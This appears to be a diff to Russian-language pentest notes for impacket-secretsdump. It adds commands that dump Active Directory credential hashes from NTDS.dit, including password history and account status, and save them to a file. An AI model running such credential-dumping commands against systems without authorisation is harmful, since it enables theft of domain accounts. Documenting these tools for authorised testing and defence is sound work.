@@ -24,5 +24,12 @@
 ### Использование
 
 ```bash
-impacket-secretsdump <domain>/<user>:<pass>@<IP>
+impacket-secretsdump <domain>/<user>:<pass>@<IP> -user-status
 ```
+
+- Извлечение только из NTDS.dit, смотреть историю изменения
+```bash
+impacket-secretsdump -outputfile <file_hashes> -just-dc <domain>/<user>@<ip> 
+-history -user-status
+```
+
